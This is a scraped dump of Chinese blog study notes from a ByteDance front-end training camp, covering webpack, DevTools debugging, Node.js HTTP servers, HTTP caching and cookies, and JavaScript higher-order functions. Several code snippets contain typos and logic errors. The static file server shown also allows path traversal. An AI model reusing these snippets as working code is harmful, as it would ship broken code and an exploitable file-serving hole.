npx webpack Babel 有什么功能 Babel 与 webpack 分别解决了什么问题 3.3 生成 HTML 安装依赖 npm i -D html-webpack-plugin 声明产物出口 output 使用插件 plugins:[new HtmlWebpackPlugin] 执行 npx webpack 相比于手工维护的 HTML 内容，这种自动生成的方式有什么优缺点？ 4. 工具线 4.1 HMR 浏览器热替换 更改配置项 devServer: { hot: true, open: true } ,watch: true // 持续监听，生成新的 执行 npx webpack server 4.2 Tree-Shaking 树摇 开启树摇 更改配置项： mode: ”production“, optimization: { usedExports: true } 对工具库如Lodash有奇效 require 不能进行 tree-shaking 4.3 其他工具 缓存 webpack5后的缓存效果才比较好 Sourcemap 性能监控 日志 代码压缩 分包 … 还有哪些可被划分为”流程类“？ 工具类配置具体有什么作用，包括 devtool/cache/stat 3. 理解 Loader 为了处理非标准 js 资源，设计出资源翻译模块 — Loader，用于将资源翻译为标准 JS 3.1 使用： 安装 Loader 添加 module 处理 需要翻译的文件 3.2 认识Loader 链式调用 前面的输出 == 后面的输入，每个 loader 比较内聚， 以 处理 less 文件为例： less-loader：实现 less 到 css 的转换 css-loader：将 css 包装成类似于 module.exports = “${css}” 的内容，包装后的内容符合js 语法 style-loader：将 css 模块包进 require 语句，并在运行时调用 injectStyle 等函数将内容注入到页面的style标签 debug工具： ndb ndb npx webpack 特点： 链式调用 支持异步执行 分 normal、pitch 两种模式 如何编写 123456// loader.jsmodule.exports = function(source,sourceMap,data?)&#123; // source 为 文件输入 // 可能是文件内容，也可以是上一个 loader 处理结果 return source;&#125; 12345678910111213141516171819// eslint-loader/index.jsimport getOptions from &#x27;./getOptions&#x27;;import Linter from &#x27;./Linter&#x27;import cacheLoader from &#x27;./cacheLoader&#x27;;export defalut function loader(content, map)&#123; const options = getOptions(this); const linter = new Linter(this, options); this.cacheable(); if(options.cache)&#123; cacheLoader(linter, content, map); return; &#125; linter.printOutput(linter.lint(content)); this.callback(null, content, map);&#125; 参考：Webpack 原理系列七：如何编写loader 常见loader 理解 js：babel、eslint、ts、buble、vue、angular2-template - loader css：css、style、less、sass、stylus、postcss - loader html：html、pug、pisthtml - loader assets：file、val、url、json5 - loader loader 输入是什么？要求输出的是什么？ loader 的链式调用是什么意思？如何串联多个 loader？ loader 中如何处理异步场景？ 4. 理解插件 4.1 插件是什么，为什么这么设计？ 插件架构精髓：对扩展开放、对修改封闭 4.2 理解插件 插件围绕钩子展开 1234567class SomePlugin&#123; apply(compiler)&#123; compiler.hooks.thisCompilation.tap(&#x27;SomePlugin&#x27;, compilation =&gt; &#123; &#125;) &#125;&#125; 钩子的核心信息： 时机：编译过程的特定节点，Webpack 会以钩子的形式通知插件此刻正在发生什么事请 上下文：通过 tapable 提供的回调机制，以参数方式传递上下文信息； 交互：在上下文参数对象中附带了很多存在 side effect 的交互接口，插件可以通过这些接口改变 123456789101112131415161718192021class EntryPlugin&#123; apply(compiler)&#123; compiler.hooks.compilation.tap( // 时机 compiler.hooks.compilation &#x27;EntryPlugin&#x27;, (compilation,&#123; normalModuleFactory &#125;) =&gt; &#123; // 参数 compilation compilation.dependencyfactories.set( // 交互 dependencyfactories.set EntryDenpendency, noemalModuleFactory ); &#125;); compiler.hooks.make.tapAsync(&#x27;EntryPlugin&#x27;, (compilation, callback) =&gt; &#123; const &#123;entry,options, context &#125; = this; const dep = EntryPlugin.createDependency(entry, options); compilation.addEntry(context, dep, options, err =&gt; &#123; callback(err); &#125;) &#125;) &#125;&#125; loader 与插件有什么区同点？ ”钩子“有什么作用？如何监听钩子函数？ 5. 学习方法 入门应用 理解打包流程 熟练掌握常用配置项、loader、插件的使用方法、能够灵活搭建集成 Vue、React、Babel、Eslint、Less、Sass、图片处理等工具的webpack环境 掌握常见脚手架工具，例如 Vue-cli、create-react-app、@angular/cli 进阶 理解Loader、Plugin机制，能够自行开发 Webpack 组件 理解常见性能优化手段，并能用于解决实际问题 理解前端工程化概念与生态现状 大师级 阅读源码，理解 编译、打包原理，能参与共建 Q&amp;A 面试掌握程度？ loader 有什么作用，怎么写 loader、常见的 loader有什么 怎么写一个 插件 bundle、chunk、module 是什么含义？ require 与 import 导入的区别？ 动态/静态代码 webpack 与 vite ？ vite：速度快 ，无 bundle，对开发性友好 webpack：生态成熟， loader 与 plugin 区别？ loader：内容翻译为js plugin：没有明确输入输出，作用于整个生命周期，在任意时间修改任意webpack组件 webpack 与 rollup webpack 更重，应对浏览器 rollup 用来构建npm包，扩展性弱，应对库的场景 webpack 优化 npx 与 npm","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"青训营","slug":"青训营","permalink":"https://shylees.github.io/tags/%E9%9D%92%E8%AE%AD%E8%90%A5/"},{"name":"webpack","slug":"webpack","permalink":"https://shylees.github.io/tags/webpack/"}]},{"title":"前端必须知道的开发调试知识 - 字节青训营","slug":"ByteDance/05 秃头披风侠 前端必须知道的开发调试知识","date":"2022-01-23T16:00:00.000Z","updated":"2022-01-23T16:00:00.000Z","comments":false,"path":"learningNotes/ByteDance/05 秃头披风侠 前端必须知道的开发调试知识","link":"learningNotes/ByteDance/05 秃头披风侠 前端必须知道的开发调试知识","permalink":"https://shylees.github.io/learningNotes/ByteDance/05%20%E7%A7%83%E5%A4%B4%E6%8A%AB%E9%A3%8E%E4%BE%A0%20%E5%89%8D%E7%AB%AF%E5%BF%85%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E5%BC%80%E5%8F%91%E8%B0%83%E8%AF%95%E7%9F%A5%E8%AF%86","excerpt":"","text":"1. Bug 与 Debug 1.1 bug来源 1.2 bug 特点 多平台：浏览器、hybrid、nodejs、小程序、桌面应用 多环境：本地开发环境、线上环境 多工具：chrome devtools、charles、spy-debugger、whistie、vconsole 多技巧：console、breakpoint、sourceMap、代理 2. Chrome devTool 2.1 Elements – 修改元素和样式 .cls 添加删除类名 右键元素 → fouce state → ± 伪类 / ：hov 对结点进行截图：元素右键 → capture node screenshot 2.2 Console – 日志页面 对 log 的值 进行 修改样式 123456console.log(&#x27;%s %o,%c%s&#x27;, &#x27;hello&#x27;, // %s字符串 &#123;name:&#x27;tom&#x27;&#125;, // o 对象 &#x27;color:red&#x27;, // c 样式？ &#x27;welcome&#x27;) // console.table 具象化 JSON 数据 转换为 table 格式 console.dir 树形结构 2.3 sources 组成 页面资源文件目录树 代码预览区 debug 工具栏 暂停 继续 断点间 单步跳过 进入函数 跳出函数 单步执行 激活 / 关闭 所有断电 代码执行异常处自动 断点调试器 xhr/fetch ：当有请求发生时触发断点 dom ：右键 break on，增删结点触发 scope：作用域 closure 闭包 call stack：调用栈 查看暂停下 变量的值： breakPoint：debugger; 区域4 的 breakpoints 可以勾选 或 取消 可以打断点；直接鼠标移动可以查看值 区域4 watch：点击 + 可以添加 变量 查看值 压缩代码如何调试： 用webpack压缩，在webpack.config.js 中 devtools：‘source-map’， 多导出一个 bundle.js.map 把压缩的代码和源码进行映射 mappings 字段存储了源文件和source map 映射 英文，表源码及压缩代码的位置关联 逗号，分割一行的内容 分号，换行 映射见：murzwin.com/base64vlqhtml source map 标准：docs.google.com/document/d/1URGAehQwRypUTovF1KRlpiOFze0b-_2gc6fAH0KY0k/edit 2.4 performance — 性能 组成 — 开始录制页面 stop 控制面板 概览面板 FPS：每秒帧数 CPU：处理各个任务花费的时间 NET：各个请求花费的时间 线程面板 Frames：帧线程 Main：主线程、负责执行js，解析html css 完成绘制 Raster：raster 线程，负责完成某个layer 或 某些块 tile 的绘制 统计面板 2.5 Network — 请求相关 可以自定义网速 2.6 application — 本地存储相关 2.7 storage中点击 clean site data 清除缓存 3. 移动端 h5 调试 真机调试：推荐扫码 代理调试： 常用工具： charles：适合查看、控制网络请求，分析数据 fiddler：与上面类似，适合windows 平台 spy-debugger：远程调试手机页面、抓包 whistie：基于node实现的跨平台web调试代理工具 4. 常用开发技巧： source：oversides，勾选，在修改后刷新会保留，右边竖三点，more tools -&gt; change 面板会显示 修改的内容 跨域问题：报 cors error 跨域错误 使用代理工具 代理：解决了同源策略的哪一项，为什么能解决跨域 同源限制只显示了浏览器 启用本地source map： 可以把 source map 代理到本地 前端埋点 小黄鸭","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"},{"name":"青训营","slug":"青训营","permalink":"https://shylees.github.io/tags/%E9%9D%92%E8%AE%AD%E8%90%A5/"}]},{"title":"Nodejs 与前端开发实战 - 字节青训营","slug":"ByteDance/09 欧阳亚东 Nodejs与前端开发实战","date":"2022-01-23T16:00:00.000Z","updated":"2022-01-23T16:00:00.000Z","comments":false,"path":"learningNotes/ByteDance/09 欧阳亚东 Nodejs与前端开发实战","link":"learningNotes/ByteDance/09 欧阳亚东 Nodejs与前端开发实战","permalink":"https://shylees.github.io/learningNotes/ByteDance/09%20%E6%AC%A7%E9%98%B3%E4%BA%9A%E4%B8%9C%20Nodejs%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%AE%9E%E6%88%98","excerpt":"","text":"1. Nodejs 的应用场景 why 前端工程化 Bundle：webpack、vite、esbuild、parcel Uglify：uglifyjs Transpile：bablejs、typescript 其他语言加入竞争：esbuild、parcel、prisma 现状：难以替代 web 服务端应用 学习曲线平缓，开发效率高 运行效率接近常见的编译语言 社区生态丰富及工具链成熟 npm、v8 inspector 与前端结合的场景会有优势 ssr 现状：竞争激烈，nodejs 有自己独特的优势 Electron 跨端桌面应用 商业应用：vscode、slack、discord、zoom 大型公司内的效率工具 现状：大部分在选型时，都值得考虑 Nodejs 在字节 BFF、SSR 服务端应用：头条搜索、西瓜视频 Electron：飞连、飞书 2. Nodejs 运行时结构 what 社区npm代码 ：acron、node-inspect 调试、npm本身 N-API：js性能太低，想用更native的语言 v8：实现js运行时 libuv：封装了操作系统api，nodejs最核心的内容 nghttp2：与 http2 相关的模块 zlib：做一些场景压缩解压缩的算法 c-ares：做dns查询的库 llhttp：做http协议的解析 openssl：网络层的加密解密协议 V8，libuv V8：JavaScript Runtime，诊断调试工具 inspector libuv：eventloop 事件循环，syscall 系统调用 举例：用 node-fetch 发起请求时… nodejs 其实是基于 v8 做的。 面试 ：libuv是用来干嘛的？ 特点 异步 I/O 单线程 worker_thread可以起独立线程，但每个线程的模型没有太大变化 JS 单线程：JS 线程 + uv 线程池 + V8 任务线程池 + V8 inspector 线程 优点：不用考虑多线程状态同步问题，也就不需要锁；同时还能比较较高效地利用系统资源 缺点：阻塞会产生更多负面影响 – 使用多进程 或者 多线程 跨平台 Nodejs 跨平台 + JS 无需编译环境 ( + web 跨平台 + 诊断工具跨平台 ) – 开发成本低、整体学习成本低 3. 编写 Http Server how 3.0 安装 nodejs 123456789101112131415161718192021222324252627282930// jsonconst http = require(&#x27;http&#x27;);const server = http.createServer((req,res) =&gt; &#123; const bufd = []; req.on(&#x27;data&#x27;,(buf) =&gt; &#123; bufs.push(buf) &#125;) req.on(&#x27;end&#x27;,() =&gt; &#123; const buf = Buffer.concat(bufs).toString(&#x27;utf8&#x27;); let msg = &#x27;hello&#x27;; try&#123; const ret = JSON.parse(buf); msg = ret.msg; &#125;catch(err)&#123; &#125; const responseJson = &#123; msg:`receive:$&#123;msg&#125;` &#125; res.setHeader(&#x27;Content-Type&#x27;, &#x27;application/json&#x27;); res.end(JSON.stringify(responseJson)) &#125;)&#125;)const port = 3000;server.listen(port, ()=&gt;&#123; console.log(`server listen on:$&#123;port&#125;`); &#125;) 3.1 编写 Http Server + Client ，收发 GET，POST 1234567891011121314151617181920212223const http = require(&#x27;http&#x27;)const body = JSON.stringify(&#123; msg: &#x27;Hello from my own client&#x27;&#125;)const req = http.request(&#x27;http://127.0.0.1:3000&#x27;,&#123; method: &#x27;POST&#x27;, headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/json&#x27;, &#125;&#125;, res =&gt; &#123; const bufs = []; res.on(&#x27;data&#x27;, buf =&gt;&#123; bufs.push(buf) &#125;) res.on(&#x27;end&#x27;, () =&gt; &#123; const buf = Buffer.concat(bufs); const json = JSON.parse(buf); console.log(&#x27;json.msg is:&#x27;, json.msg) &#125;)&#125;)req.end(body) 1234567891011121314151617181920212223242526272829303132333435363738// 用 promise + async await 重写这两例子// 技巧：将callback 转换为 promise// eg：改写 上上个代码const http = require(&#x27;http&#x27;);const server = http.createServer(async (req,res) =&gt; &#123; const msg = await new Promise((resolve, reject) =&gt; &#123; //change const bufd = []; req.on(&#x27;data&#x27;,(buf) =&gt; &#123; bufs.push(buf) &#125;) req.on(&#x27;error&#x27;, (err) =&gt; &#123; // change reject(err) // change &#125;) // change req.on(&#x27;end&#x27;,() =&gt; &#123; const buf = Buffer.concat(bufs).toString(&#x27;utf8&#x27;); let msg = &#x27;hello&#x27;; try&#123; const ret = JSON.parse(buf); msg = ret.msg; &#125;catch(err)&#123; &#125; resolve(msg); // change &#125;) &#125;) const responseJson = &#123; msg:`receive:$&#123;msg&#125;` &#125; res.setHeader(&#x27;Content-Type&#x27;, &#x27;application/json&#x27;); res.end(JSON.stringify(responseJson))&#125;)const port = 3000;server.listen(port, ()=&gt;&#123; console.log(`server listen on:$&#123;port&#125;`); &#125;) 3.2 编写静态资源服务器 简单静态文件服务： 与高性能、可靠的服务相比，还差：CDN 缓存加速、分布式储存、容灾 外部服务：cloudflare，七牛云，阿里云，华山云 用 stream 风格的 api 有什么好处？ 占用尽可能少的内存空间、内存使用率更好 1234567891011121314151617181920212223const http = require(&#x27;http&#x27;);const fs = require(&#x27;fs&#x27;);const path = require(&#x27;path&#x27;);const url = require(&#x27;url&#x27;);const folderPath = path.resolve(__dirname, &#x27;./static&#x27;);const server = http.createServer((req,res) =&gt; &#123; // expected http://127.0.0.1:3000/index.html const info = url.parse(req.url); // static/index.html const filepath = path.resolve(folderPath, &#x27;./&#x27;, info.path); // stream api.. const filestream = fs.createReadStream(filepath); res.pipe(filestream) &#125;)const port = 3000;server.listen(port, ()=&gt;&#123; console.log(`server listen on:$&#123;port&#125;`); &#125;) 3.3 编写 React SSR SSR — server side rendering 特点： 相比传统 HTML 模板引擎：避免重复编写代码 相比 SPA：首屏渲染更快，seo 友好 缺点：通常qps 较低，前端代码编写时要考虑服务端渲染情况 3.4 适用 inspector 进行调试、诊断 v8 inspector：开箱即用，特性丰富强大，与前端开发一致，跨平台 启动时 node --inspect 文件.js open http://localhost:9229/json 场景： 查看 console.log 内容 breakpoint 高 cpu、死循环：cpuprofile 高内存占用：heapsnapshot 性能分析 3.5 部署简介 解决的问题： 守护进程：当进程退出时，重新拉起 多进程：cluster 便捷地利用多进程 记录进程状态，用于诊断 容器环境： 通常有健康检查的手段，只需要考虑多核 cpu 利用率即可 4. 延伸话题 nodejs 贡献代码 追踪/诊断 WASM，NAPI","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"青训营","slug":"青训营","permalink":"https://shylees.github.io/tags/%E9%9D%92%E8%AE%AD%E8%90%A5/"},{"name":"nodejs","slug":"nodejs","permalink":"https://shylees.github.io/tags/nodejs/"}]},{"title":"HTTP 指南 - 字节青训营","slug":"ByteDance/08 杨超男 http指南","date":"2022-01-21T16:00:00.000Z","updated":"2022-01-21T16:00:00.000Z","comments":false,"path":"learningNotes/ByteDance/08 杨超男 http指南","link":"learningNotes/ByteDance/08 杨超男 http指南","permalink":"https://shylees.github.io/learningNotes/ByteDance/08%20%E6%9D%A8%E8%B6%85%E7%94%B7%20http%E6%8C%87%E5%8D%97","excerpt":"","text":"1. 初始：什么是HTTP 什么是HTTP Hyper Text Transfer Protocol 应用层协议、基于TCP 请求、响应 简单可扩展 无状态 2. 协议分析：报文结构 发展 HTTP 0.9 — 单行协议 请求GET/mypage.html、响应只有HTML文档 HTTP 1.0 — 构建可扩展性 增加了Header、有了状态码、支持多种文档、… HTTP 1.1 — 标准化协议 链接复用、缓存、内容协商、… HTTP 2 — 更加优异的表现 二进制协议、压缩header、服务器推送、… HTTP 3 — 草案 报文 + start line ：Method Path Version Method： GET — 请求一个指定资源，只用于获取数据 POST — 用于将实体提交到指定的资源，通常导致在服务器上的状态变化或副作用 PUT — 用于请求有效载荷替换目标资源的所有当前表示 DELETE — 删除指定资源 HEAD — 请求与get响应相同的响应头 CONNECT — 建立一个到目标资源标识的服务器的隧道 OPTIONS — 用于描述目标资源的通信选项 TRACE — 沿着到目标资源的路径执行一个消息环回测试 PATCH — 用于对资源应用部分修改 Safe：不会修改服务器的数据的方法：GET、HEAD、OPTIONS Idempotent幂等：同样的请求被执行一次或多次的效果是一样的，服务器的状态也是一样的：GET、HEAD、OPTIONS、PUT、DELETE 状态码 200、301、302、401 (请求未经授权)、404、500、504(网关或代理服务器处理超时) RESTful API 一种API设计风格，REST — Representational State Transfer 每一个URI代表一种资源 客户端和服务器之间，传递这种资源的某种表现层 客户端通过HTTP method，对服务器资源进行操作，实现“表现层状态转化” + HTTP Headers 请求头 Accept：接收类型，表示浏览器支持的MIME类型，对标服务器端返回的Content-type Content-Type：客户端发送出去的实体内容的类型 Cache-Control：指定请求和响应遵循的缓存机制 If-Modified-Since：对应服务端的Last-Modified，用来匹配看文件是否变动，精确1s内 Expires：缓存控制，在这个时间内直接使用请求 Max-age：资源再本地缓存多少秒 If-None-Match：对应服务端Etag，匹配文件内容是否改变，较精确 Cookie：有cookie并且同域访问时会自动带上 Referer：该页面的来源URL，适用所有类型请求，详细到页面地址，csrf拦截会用到 Origin：最初请求从哪发起的，只精确到端口号，比上更尊重隐私 User-Agent：用户客户端的一些必要信息 响应头 Content-Type：服务端返回的实体内容的类型 Cache-Control：指定请求和响应遵循的缓存机制 Last-Modified：请求资源的最后修改时间 Expires：在什么时候认为文档已经过期，不再缓存 Max-age：资源再本地缓存多少秒，开启Cache-Control后有效 Etag：资源的特定版本标识符 Set-Cookie：设置于页面关联的cookie，将其传给客户端 Server：服务器的一些信息 Access-Control-Allow-Origin：服务器端允许请求Origin头部 缓存 强缓存 Expires，时间戳 Cache-Content 可缓存性：no-cache 协商缓存验证、no-store 不使用任何缓存 到期：max-age 存储的最大周期/秒，相对于请求时间 重新验证/重新加载：must-revalidate：一旦资源过期，在成功向原始服务器验证之前，不能使用 协商缓存 Etag/If-None-Match：资源特定版本的标识符 Last-Modified/If-Modified-Since：最后最该时间 cookie Name=value Expires=Date：有效期，缺省时表在浏览器关闭前有效 Path=Path：限制指定cookie的发送范围的文件目录，默认为当前 Domain=domain：限制cookie生效的域名，默认为创建cookie的服务域名 secure：仅在HTTPS安全连接时，才可以发送cookie HttpOnly：js脚本无法获得 SameSite=[None|Strict|Lax]：None同站、跨站请求都可以发送、Strict 仅在同站发送、lax允许与顶级导航一起发送，并将与第三方网站发起的GET请求一起发送 + empty line + body 发展 HTTP2 更快、更稳定、更简单 帧 frame：HTTP/2 通信的最小单位，每个帧都包含帧头，至少会标识出当前帧所属的数据流 二进制 消息：与逻辑请求或响应消息对应的完整的一系列帧 数据流：已建立的连接内的双向字节流，可以承载一条或多条消息 交错发送，接收方重组织 HTTP/2 连接都是永久的，而且仅需要每个来源一个连接 流控制：组织发送方 向 接收方 发送大量数据的机制 服务器推送 HTTPS 概述 HTTPS：Hypertext Transfer Protocol Secure 经过 TSL/SSL加密 对称加密：加解密都是使用同一个密钥 非对称加密：需要是哦那个两个不同的密钥，公钥 public key、私钥 private key 3. 常见场景：静态资源、登陆 静态资源 — 今日头条 index.css 状态码200就一定是发起请求了吗？ 从Response中观察 缓存策略、资源类型、允许访问的域名 静态资源方案：缓存+CDN+文件打包时产生的hash 登录 为什么有options的请求？ – cross-origin cors：复杂请求会进行预请求，获知服务器端是否允许该跨源请求 相关协议头： Access-Control-Allow-Origin、 Access-Control-Expose-Headers Access-Control-Max-Age Access-Control-Allow-Credentials Access-Control-Allow-Methods Access-Control-Allow-Headers Access-Control-Request-Method Access-Control-Request-Method Access-Control-Request-Headers Origin 跨域的解决方案：cors、代理服务器、iframe、jsonp… 从Response 和 Request 观察 向什么地址做了什么动作、携带了/返回了什么信息 下一次进入页面为什么能记住登陆态？ — 鉴权 session+cookie 、JWT json web token 进入同个网站的其他站点为什么也有登录态？— SSO 单点登录 4. 实际应用：浏览器与node中使用 浏览器 + AJAX 之 XHR XHR：XMLHttpRequest readyState： 0 UNSENT 代理被创建 1 OPENED open() 已被调用 2 Header-received send() 已经被调用，获得头部和状态 3 loading 下载中，responseText 属性已有部分数据 4 done 下载已完成 + AJAX 之 Fetch XHLHttpRequest 的升级版 使用 Promise 模块化设计，Response，Request、Header 对象 通过数据流处理对象，支持分块读取 node 标准库：HTTP/HTTPS 实战 请求库：axios 用户体验： 网络优化：http2、cdn动态加速、dns预解析、网络预连接、域名收敛/发散、压缩、https性能优化 稳定性：重试机制(超时、有误)、缓存、数据安全(Https、劫持) 5.了解更多：不止HTTP协议一个选择 WebSocket 浏览器与服务器进行全双工通讯的网络技术 URL使用ws:// 或 wss:// 等开头 场景：实时性要求高、聊天室 QUIC 基于http3，udp，目前还是草案状态","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"青训营","slug":"青训营","permalink":"https://shylees.github.io/tags/%E9%9D%92%E8%AE%AD%E8%90%A5/"},{"name":"网络","slug":"网络","permalink":"https://shylees.github.io/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"月影讲js - 字节青训营","slug":"ByteDance/03 月影讲js","date":"2022-01-16T16:00:00.000Z","updated":"2022-01-16T16:00:00.000Z","comments":false,"path":"learningNotes/ByteDance/03 月影讲js","link":"learningNotes/ByteDance/03 月影讲js","permalink":"https://shylees.github.io/learningNotes/ByteDance/03%20%E6%9C%88%E5%BD%B1%E8%AE%B2js","excerpt":"","text":"通过 html css 触发事件 123456789101112&lt;input id=&quot;modeCheckBox&quot; type=&quot;checkbox&quot;&gt;&lt;/input&gt;&lt;div class=&quot;content&quot;&gt; &lt;label id=&quot;modeBtn&quot; for=&quot;modeCheckBox&quot;&gt;&lt;/label&gt;&lt;/div&gt;// 点击 label 就会选择 input[type=&quot;checkbox&quot;]&lt;style&gt; #modeCheckBox:checked + .content&#123; background-color:black; &#125; &lt;/style&gt; 组件 — 自定义事件 — 解耦 123456789101112131415// 自定义事件const detail = &#123;index: idx&#125;;const event = new CustomEvent(&#x27;slide&#x27;,&#123;bubbles:true, detail&#125;) this.contailer.dispatchEvent(event)let dom = document.querySelector(&#x27;#app&#x27;);// 绑定事件， 传递过来的值可以通过ev.detail 来获取dom.addEventListener(&#x27;log-in&#x27;,(ev) =&gt; &#123; const &#123; detail &#125; = ev; console.log(detail); // hello&#125;)// 派发事件，需要传入两个参数，一个是事件类型，另外一个是一个对象，detail就是传递过去的值dom.dispatchEvent(new CustomEvent(&#x27;log-in&#x27;,&#123; detail:&#x27;hello&#x27;&#125;)) web页面抽出来一个个包含模板 html、功能 js 和 样式 css 设计原则：封装性、正确性、扩展性、复用性 实现步骤：结构设计、展现效果、行为设计（API 功能 Event 控制流 — 解耦） 三次重构： 使用插件：code.h5jun.com/weru/edit?js,output 模板化：code.h5jun.com/weru/3/edit?js,output 组件框架：code.h5jun.com/vata/4/edit?js,output 过程抽象 为了让“只执行一次”的需求覆盖不同的事件处理，可以将这个需求剥离出来，这个过程就是过程抽象 once：code.h5jun.com/zoqop/edit?js,output 高阶函数：函数作为函数的 参数 或者 返回值，常用于函数装饰器 接收一个函数作为参数，返回另一个参数，eg： 1234567// 等价装饰 0级高阶函数 等价范式// 调用次函数装饰器 相当于 直接调用 fn function HOF0(fn)&#123; return function(...args)&#123; return fn.apply(this,args); &#125;&#125; 常用的高阶函数： once 12345678function limit(fn,times = 1)&#123; return function(...args)&#123; return times-- &gt; 0 ? fn.apply(this,args) : null; &#125;&#125;function foo = limit(() =&gt; &#123; console.log(&#x27;foo&#x27;)&#125;,2) throttle：code.h5jun.com/gale/1/edit?js,output 1234567891011function throttle(fn,dur)&#123; var timer; return function(...args)&#123; if(timer == null)&#123; fn.apply(this,arguments); timer = setTimeout(()=&gt;&#123; cleanTimeout(timer); &#125;,dur) &#125; &#125;&#125; debounce：code.h5jun.com/wik/edit?js,output 12345678910function debounce(fn, dur)&#123; dur = dur || 100; var timer; return function()&#123; clearTimeout(time); timer = setTimeout(()=&gt;&#123; fn.apply(this,arguments); &#125;,dur); &#125;&#125; consumer ：code.h5jun.com/roka/7/edit?js,output res + i = res ​ code.h5jun.com/bucu/3/edit?js,output hit + 123 123456789101112131415function consumer(fn,time)&#123; let tasks = [],timer; return function(...args)&#123; tasks.push(fn.bind(this,...args)); if(timer == null)&#123; timer = setInterval(() =&gt; &#123; tasks.shift().call(this); if(tasks.length &lt;= 0)&#123; clearTnterval(timer); timer = null; &#125; &#125;,time) &#125; &#125; &#125; lterative：code.h5jun.com/kapef/edit?js,output 批量操作 123456789101112131415const inIterable = obj =&gt; obj != null %% typeof obj[Symbol.iterator] === &#x27;function&#x27;;function iterative(fn)&#123; return function(subject, ...rest)&#123; if(inIterable(subject))&#123; const ret = []; for(let obj of subject)&#123; ret.push(fn.apply(this,[obj, ...rest])); &#125; return ret; &#125; return fn.apply(this,[subject, ...rest]); &#125;&#125; 为什么使用高阶函数：减少系统的纯函数、便于测试 pure纯函数：输入确定后输出就是确定的，便于做单例测试 add(x,y) impure非纯函数：依赖外部环境，setColor次序，时间，次数不同结构不同 （操作dom都非）可以用纯函数 iterative 包 setColor 得到一个纯函数 编程范式 命令式：关心执行过程 和 声明式：不关心 12345678910111213// 声明式 三态function toggle(... actions)&#123; return function(...args)&#123; let action = actions.shift(); actions.push(action); return action.apply(this,args); &#125;&#125;swicher.onclick = toggle( evt =&gt; evt.target.className = &#x27;off&#x27;, evt =&gt; evt.target.className = &#x27;on&#x27;) 案例 交通灯 洗牌 12345678910111213141516171819function shuffle(cards)&#123; const c = [...cards]; for(let i = c.length; i &gt; 0; i--)&#123; const pindex = Math.floor(Math.random() * i); [c[pindex],c[i-1]] = [c[i-1], c[pindex]]; &#125; return c;&#125;// 抽牌// code.h5jun.com/zamuv/edit?js,consolefunction * draw(cards)&#123; const c = [...cards]; for(let i = c.length; i &gt; 0; i--)&#123; const pindex = Math.floor(Math.random() * i); [c[pindex],c[i-1]] = [c[i-1], c[pindex]]; yield c[i-1]; &#125;&#125; 是否是4的幂 分红包 利用了抽牌的思路：code.h5jun.com/luba/edit?js,console","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"},{"name":"青训营","slug":"青训营","permalink":"https://shylees.github.io/tags/%E9%9D%92%E8%AE%AD%E8%90%A5/"}]},{"title":"包装对象与toString、valueOf隐式调用","slug":"further/01 toString valueof","date":"2021-12-16T16:00:00.000Z","updated":"2021-12-16T16:00:00.000Z","comments":false,"path":"furtherNotes/further/01 toString valueof","link":"furtherNotes/further/01 toString valueof","permalink":"https://shylees.github.io/furtherNotes/further/01%20toString%20valueof","excerpt":"","text":"问辉哥for in hasOwnPrototype 的时候，他问我String 有没有 toString 方法， 然后提到了包装对象 和 toString 的隐式调用 包装对象 https://www.jianshu.com/p/32465288e738 隐式转换 https://juejin.cn/post/6844903557968166926 隐式调用 https://juejin.cn/post/6844903749090017294 1. 包装对象 1.1 定义 对象是 JavaScript 语言中最主要的数据类型，三种原始类型的值：Number、Boolean、String 的值，在一定的条件下也会自动转为对象，即原始类型的 ” 包装对象 “ wrapper 所谓的包装对象，指的是与数值、字符串、布尔值分别相应的 Number、String、Boolean 三个原生对象。这三个原生对象可以把原始类型的值包装成对象。 123456789101112131415var v1 = new Number(123);var v2 = new String(&#x27;abc&#x27;);var v3 = new Boolean(true);typeof v1 // &quot;object&quot;typeof v2 // &quot;object&quot;typeof v3 // &quot;object&quot;v1 == 123 // truev2 == &#x27;abc&#x27; // truev3 == true // truev1 === 123 // falsev2 === &#x27;abc&#x27; // falsev3 === true // false 1.2 设计目的 包装对象的设计目的： 使得”对象“这种类型可以覆盖 JavaScript 所有的值，整门语言有一个通用的数据模型 使得原始类型的值有办法调用自己的方法 1.3 普通函数 和 构造函数 使用 作为普通函数调用（String(123) ）：将任意类型的值转为原始类型的值 作为构造函数使用（ new String(123) ）：可以将原始类型的值转为 对象 12String(123) // &quot;123&quot;new String(123) // String &#123;&quot;123&quot;&#125; 1.4 方法 1.4.1 实例方法 三种包装对象都具有的、从 object 对象继承的方法：valueOf() 和 toString() 1.4.1.1 valueOf() 返回包装对象实例对应的原始类型的值 123new Number(123).valueOf() // 123new String(123).valueOf() // &quot;123&quot;new Boolean(123).valueOf() // true 1.4.1.2 toString() 返回对应的字符串形式 123new Number(123).toString() // &quot;123&quot;new String(123).toString() // &quot;123&quot;new Boolean(123).toString() // &quot;true&quot; 1.4.2 原始类型与实例对象的自动转换 某些场合，原始类型的值会自动当作包装对象调用，即调用包装对象的属性和方法，此时 JavaScript 引擎会自动将原始类型的值转为包装对象的实例，并在使用后立即销毁实例。 eg： 12345let str = &quot;abc&quot;; // === new String(str)str.length // 3str.x = 123str.x // undefined 如上述的 str 是一个字符串，本身不是对象，不能调用 length 属性。JavaScript 引擎自动将其转为包装对象，在这个对象上调用 length 属性。调用结束后，这个临时对象就会被销毁。这就是原始类型与实例对象的自动转换。 上述第二个例子，返回 undefined 的原因有： 自动转换生成的包装对象是只读的 调用结束后，包装对象的实例会销毁，意味着下次调用字符串属性时，调用的是一个新的对象 如果要为字符串添加属性，只有在其原型对象 String.prototype 上定义 1.4.3 自定义方法 除了原生的实例方法，包装对象还可以自定义方法和属性，供原始类型的值直接调用 